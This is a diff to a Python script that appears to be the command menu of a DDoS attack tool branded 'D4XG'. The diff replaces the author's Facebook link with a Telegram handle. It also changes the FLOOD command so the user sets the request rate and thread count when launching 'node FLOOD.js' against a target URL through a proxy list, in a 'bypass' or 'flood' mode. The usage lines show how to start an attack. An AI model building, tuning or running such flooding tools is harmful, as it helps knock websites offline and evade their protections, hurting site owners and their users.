@@ -1,4 +1,4 @@
-# D4XG | facebook.com/d4xgg
+# D4XG | t.me/xDAXG
 from operator import index
 import signal
 import socket
@@ -504,13 +504,15 @@ def main():
                         try:
                                 url = sin.split()[1]
                                 time = sin.split()[2]
-                                mode = sin.split()[3]
+                                rate = sin.split()[3]
+                                thread = sin.split()[4]
+                                mode = sin.split()[5]
                                 Screen.wrapper(attack)
                                 os.system ("clear")
-                                os.system(f'cd VIP && node FLOOD.js {url} {time} 200 8 proxy.txt {mode}')
+                                os.system(f'cd VIP && node FLOOD.js {url} {time} {rate} {thread} proxy.txt {mode}')
                         except (ValueError, IndexError):
-                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mFLOOD <url> <time> <bypass/flood>")
-                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mFLOOD https://example.com 120 bypass')
+                                print(" \x1b[38;5;160m[ \x1b[38;5;255m! \x1b[38;5;160m] Usage: \x1b[38;5;255mFLOOD <url> <time> <64-200> <12> <bypass/flood>")
+                                print(' \x1b[38;5;160m[ \x1b[38;5;255m? \x1b[38;5;160m] Example: \x1b[38;5;255mFLOOD https://example.com 120 64 12 bypass')
                  
                 elif sinput == "HOME" or sinput == "home":
                         try:
